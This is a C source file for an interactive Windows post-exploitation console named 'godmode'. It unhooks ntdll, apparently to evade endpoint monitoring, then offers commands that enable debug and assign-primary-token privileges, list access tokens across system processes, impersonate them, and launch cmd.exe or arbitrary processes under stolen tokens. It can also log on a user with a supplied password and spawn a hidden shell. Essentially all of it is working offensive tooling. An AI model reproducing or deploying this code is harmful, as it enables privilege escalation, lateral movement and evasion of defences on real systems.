#include <stdio.h>
#include <Windows.h>
#include <minwindef.h>
#include <winternl.h>

#include "unhook.h"
#include "systeminfo.h"
#include "token.h"
#include "syscalls.h"
#include "privileges.h"

typedef unsigned long DWORD;

#define MAX_COMMAND_BUFFER_LEN 256
#define PROMPT "\n# "

int main()
{
    int should_exit = FALSE;

    printf("[*] Unhooking ntdll...\n");
    unhookNtdll();
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    if (!print_version(hNtdll))
    {
        return 1;
    }

    BOOL is_impersonating = FALSE;

    while (!should_exit)
    {
        printf(PROMPT);
        char command_buf[MAX_COMMAND_BUFFER_LEN];

        scanf_s("%255s", &command_buf, MAX_COMMAND_BUFFER_LEN);

        if (strcmp(command_buf, "exit") == 0)
        {
            should_exit = TRUE;
        }

        // ------------------------------------------------------------------------------------------------------------------
        // Priv Module 

        else if (strcmp(command_buf, "priv.debug") == 0)
        {
            enable_privilege(is_impersonating, SE_DEBUG_NAME);
        }

        else if (strcmp(command_buf, "priv.assign") == 0)
        {
            enable_privilege(is_impersonating, SE_ASSIGNPRIMARYTOKEN_NAME);
        }

        // ------------------------------------------------------------------------------------------------------------------
        // Token Module

        else if (strcmp(command_buf, "token.current") == 0)
        {
            // Access token
            HANDLE currentToken;
            OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &currentToken);
            Token t;
            t.tokenHandle = currentToken;
            get_token_information(&t);
            printf("Access Token: %ws\n", t.tokenUsername);

            // Impersonation token
            t.tokenHandle = GetCurrentThreadToken();
            get_token_information(&t);
            printf("Impersonated Client: %ws\n", t.tokenUsername);
        }
        else if (strcmp(command_buf, "token.list") == 0)
        {
            Token availableTokens[1024];
            list_available_tokens(hNtdll, availableTokens);
        }
        else if ((strcmp(command_buf, "token.cmd") == 0) || (strcmp(command_buf, "token.run") == 0))
        {
            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonatePrivilege is needed for token impersonation");
                continue;
            }

            Token availableTokens[1024];
            list_available_tokens(hNtdll, availableTokens);

            printf("Enter token ID to use: ");
            int token_id;
            scanf_s("%d", &token_id);
            printf("\n"); 

            Token tokenToUse = availableTokens[token_id];

            if (strcmp(command_buf, "token.cmd") == 0)
            {
                run_cmd(&tokenToUse, L"C:\\Windows\\system32\\cmd.exe");
            }
            else // token.run
            {
                printf("Enter command to run: ");
                wchar_t cmd_to_run[MAX_PATH];
                scanf_s("%ws", cmd_to_run, MAX_PATH);
                run_cmd(&tokenToUse, cmd_to_run);
            }
        }
        else if (strcmp(command_buf, "token.impersonate") == 0)
        {
            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonatePrivilege is needed for token impersonation");
                continue;
            }

            Token availableTokens[1024];
            list_available_tokens(hNtdll, availableTokens);

            printf("Enter token ID to use: ");
            int token_id;
            scanf_s("%d", &token_id);
            printf("\n");

            is_impersonating = impersonate(&availableTokens[token_id]);
        }
        else if (strcmp(command_buf, "token.revert") == 0)
        {
            RevertToSelf();
            is_impersonating = FALSE;
        }
        else if (strcmp(command_buf, "token.logon") == 0)
        {
            HANDLE newLogonToken;
            wchar_t lpszUsername[MAX_PATH], lpszDomain[MAX_PATH], lpszPassword[MAX_PATH];

            printf("Enter domain: ");
            scanf_s("%ws", lpszDomain, MAX_PATH);
            printf("Enter username: ");
            scanf_s("%ws", lpszUsername, MAX_PATH);
            printf("Enter password: ");
            scanf_s("%ws", lpszPassword, MAX_PATH);

            if (!LogonUserW(lpszUsername, lpszDomain, lpszPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newLogonToken))
            {
                printf("[!] LogonUserW failed: %i", GetLastError());
            }
            else
            {
                printf("[*] User logged on. Creating cmd.exe process as user in background...");
                STARTUPINFO si;
                PROCESS_INFORMATION pi;

                if (!enable_privilege(is_impersonating, SE_INCREASE_QUOTA_NAME))
                {
                    printf("[!] SeIncreaseQuota is needed for token impersonation");
                    continue;
                }

                if (!enable_privilege(is_impersonating, SE_ASSIGNPRIMARYTOKEN_NAME))
                {
                    printf("[!] SeAssignPrimaryToken is needed for token impersonation");
                    continue;
                }

                if (!CreateProcessAsUserW(newLogonToken, L"C:\\Windows\\system32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
                {
                    printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
                    continue;
                }

                printf("[*] User logged on. See token.list\n");
            }
        }

        // ------------------------------------------------------------------------------------------------------------------

        else
        {
            printf("priv module:\n");
            printf("\tpriv.debug - enable debug priv\n");
            printf("\tpriv.assign - enable assignprimarytoken priv\n\n");
            printf("token module:\n");
            printf("\ttoken.current - show current security tokens\n");
            printf("\ttoken.revert - revert to self\n");
            printf("\ttoken.list - list available tokens for all system processes\n");
            printf("\ttoken.cmd - run cmd.exe with a token from token.list\n");
            printf("\ttoken.run - run any process with a token from token.list\n");
            printf("\ttoken.impersonate - impersonate a token from token.list\n");
            printf("\ttoken.logon - logon a user with a password\n\n");
            printf("\texit - exit godmode\n");
        }
    }

    return 0;
}
